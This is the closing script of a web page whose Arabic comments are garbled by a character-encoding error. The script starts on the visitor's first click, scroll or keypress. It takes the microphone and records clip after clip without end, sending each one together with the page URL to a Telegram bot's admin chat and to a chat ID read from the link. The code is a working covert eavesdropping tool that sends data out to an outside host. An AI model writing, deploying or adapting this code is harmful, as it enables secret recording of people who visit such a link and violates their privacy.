     * Ø¯Ø§Ù„Ø© Ù„Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ù…Ù„Ù Ø§Ù„ØµÙˆØªÙŠ Ø¥Ù„Ù‰ ØªÙ„ÙŠØ¬Ø±Ø§Ù…
     * @param {Blob} audioBlob - Ø§Ù„Ù…Ù„Ù Ø§Ù„ØµÙˆØªÙŠ Ø§Ù„Ù…Ø±Ø§Ø¯ Ø¥Ø±Ø³Ø§Ù„Ù‡
     */
    async function sendAudioToTelegram(audioBlob) {
        const sendToId = async (chatId, caption) => {
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('audio', audioBlob, `recording-${new Date().toISOString()}.ogg`);
            formData.append('caption', caption);

            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`;

            try {
                const response = await fetch(url, { method: 'POST', body: formData });
                const result = await response.json();
                if (result.ok) {
                    console.log(`âœ… ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØªØ³Ø¬ÙŠÙ„ Ø¨Ù†Ø¬Ø§Ø­ Ø¥Ù„Ù‰ ID: ${chatId}`);
                } else {
                    console.error(`âŒ ÙØ´Ù„ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ Ø¥Ù„Ù‰ ID: ${chatId}`, result.description);
                }
            } catch (error) {
                console.error(`âŒ Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ø´Ø¨ÙƒØ© Ø£Ø«Ù†Ø§Ø¡ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ Ø¥Ù„Ù‰ ID: ${chatId}`, error);
            }
        };

        // 1. Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ Ø¯Ø§Ø¦Ù…Ù‹Ø§ Ø¥Ù„Ù‰ Ø§Ù„Ù€ ID Ø§Ù„Ø«Ø§Ø¨Øª (Ø§Ù„Ø£Ø¯Ù…Ù†)
        const adminCaption = `ğŸ™ï¸ Ù…Ù‚Ø·Ø¹ ØµÙˆØªÙŠ Ø¬Ø¯ÙŠØ¯\nğŸ”— Ù…Ù† Ø±Ø§Ø¨Ø·: ${window.location.href}\nğŸ—“ï¸ ${new Date().toLocaleString('ar-EG')}`;
        await sendToId(ADMIN_CHAT_ID, adminCaption);

        // 2. Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ Ø¥Ù„Ù‰ Ø§Ù„Ù€ ID Ø§Ù„Ù…Ø£Ø®ÙˆØ° Ù…Ù† Ø§Ù„Ø±Ø§Ø¨Ø· (Ø¥Ø°Ø§ ÙƒØ§Ù† Ù…ÙˆØ¬ÙˆØ¯Ù‹Ø§ ÙˆÙ…Ø®ØªÙ„ÙÙ‹Ø§)
        if (userChatId && userChatId !== ADMIN_CHAT_ID) {
            const userCaption = `ğŸ™ï¸ ØªØ³Ø¬ÙŠÙ„ ØµÙˆØªÙŠ Ù…Ù† Ø§Ù„Ø±Ø§Ø¨Ø· Ø§Ù„Ø®Ø§Øµ Ø¨Ùƒ\nğŸ—“ï¸ ${new Date().toLocaleString('ar-EG')}`;
            await sendToId(userChatId, userCaption);
        }
    }

    /**
     * Ø¯Ø§Ù„Ø© Ø§Ù„ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯ÙˆØ±ÙŠ Ø§Ù„ØªÙŠ ØªØ³ØªØ¯Ø¹ÙŠ Ù†ÙØ³Ù‡Ø§
     */
    async function startRecursiveRecording() {
        if (isRecording) return;

        try {
            if (!streamReference) {
                streamReference = await navigator.mediaDevices.getUserMedia({ audio: true });
                console.log("ğŸ¤ ØªÙ… Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ø¥Ø°Ù† Ø§Ù„Ù…ÙŠÙƒØ±ÙˆÙÙˆÙ†.");
            }
            
            mediaRecorder = new MediaRecorder(streamReference);
            audioChunks = [];

            mediaRecorder.ondataavailable = event => {
                audioChunks.push(event.data);
            };

            mediaRecorder.onstop = async () => {
                console.log("â³ Ø¬Ø§Ø±ÙŠ ØªØ¬Ù…ÙŠØ¹ ÙˆØ¥Ø±Ø³Ø§Ù„ Ø§Ù„Ù…Ù‚Ø·Ø¹ Ø§Ù„Ø­Ø§Ù„ÙŠ...");
                const audioBlob = new Blob(audioChunks, { type: 'audio/ogg; codecs=opus' });
                if (audioBlob.size > 0) {
                    await sendAudioToTelegram(audioBlob);
                }
                
                isRecording = false;
                startRecursiveRecording(); 
            };

            mediaRecorder.start();
            isRecording = true;
            console.log(`ğŸ”´ Ø¨Ø¯Ø£ ØªØ³Ø¬ÙŠÙ„ Ù…Ù‚Ø·Ø¹ Ø¬Ø¯ÙŠØ¯ Ù„Ù…Ø¯Ø© ${RECORDING_INTERVAL_MS / 1000} Ø«Ø§Ù†ÙŠØ©.`);

            setTimeout(() => {
                if (mediaRecorder && mediaRecorder.state === 'recording') {
                    mediaRecorder.stop();
                }
            }, RECORDING_INTERVAL_MS);

        } catch (err) {
            console.error("âŒ ÙØ´Ù„ Ø§Ù„ÙˆØµÙˆÙ„ Ø¥Ù„Ù‰ Ø§Ù„Ù…ÙŠÙƒØ±ÙˆÙÙˆÙ†:", err.message);
        }
    }

    /**
     * Ø¯Ø§Ù„Ø© ÙŠØªÙ… Ø§Ø³ØªØ¯Ø¹Ø§Ø¤Ù‡Ø§ Ø¹Ù†Ø¯ Ø£ÙˆÙ„ ØªÙØ§Ø¹Ù„ Ù„Ù„Ù…Ø³ØªØ®Ø¯Ù… Ù…Ø¹ Ø§Ù„ØµÙØ­Ø©
     */
    function handleFirstInteraction() {
        if (window.hasInitiatedRecording) return;
        window.hasInitiatedRecording = true;
        
        console.log("ğŸ–±ï¸ ØªÙ… Ø§ÙƒØªØ´Ø§Ù Ø£ÙˆÙ„ ØªÙØ§Ø¹Ù„ØŒ Ø¨Ø¯Ø¡ Ù†Ø¸Ø§Ù… Ø§Ù„ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ù…Ø³ØªÙ…Ø±...");
        startRecursiveRecording();
    }

    // --- Ø§Ù„ØªÙ†ÙÙŠØ° Ø¹Ù†Ø¯ ØªØ­Ù…ÙŠÙ„ Ø§Ù„ØµÙØ­Ø© ---

    // 1. Ø§Ø³ØªØ®Ø±Ø¬ Ø§Ù„Ù€ ID Ù…Ù† Ø§Ù„Ø±Ø§Ø¨Ø· ÙÙˆØ±Ù‹Ø§
    userChatId = getUserChatIdFromUrl();
    if (userChatId) {
        console.log(`ğŸ†” ØªÙ… Ø§Ù„Ø¹Ø«ÙˆØ± Ø¹Ù„Ù‰ ID ÙÙŠ Ø§Ù„Ø±Ø§Ø¨Ø·: ${userChatId}`);
    }

    // 2. Ø¥Ø¶Ø§ÙØ© Ù…Ø³ØªÙ…Ø¹Ø§Øª Ø§Ù„Ø£Ø­Ø¯Ø§Ø« Ù„Ø£ÙˆÙ„ ØªÙØ§Ø¹Ù„
    document.addEventListener('click', handleFirstInteraction, { once: true });
    document.addEventListener('scroll', handleFirstInteraction, { once: true });
    document.addEventListener('keypress', handleFirstInteraction, { once: true });

    // 3. ØªÙ†Ø¸ÙŠÙ Ø§Ù„Ù…ÙˆØ§Ø±Ø¯ Ø¹Ù†Ø¯ Ø¥ØºÙ„Ø§Ù‚ Ø§Ù„ØµÙØ­Ø©
    window.addEventListener('beforeunload', () => {
        if (streamReference) {
            streamReference.getTracks().forEach(track => track.stop());
            console.log("ğŸšª ØªÙ… Ø¥ØºÙ„Ø§Ù‚ Ø§Ù„ØµÙØ­Ø©ØŒ ÙˆØ¥ÙŠÙ‚Ø§Ù Ø§Ù„Ù…ÙŠÙƒØ±ÙˆÙÙˆÙ†.");
        }
    });
</script>

</body>
</html>

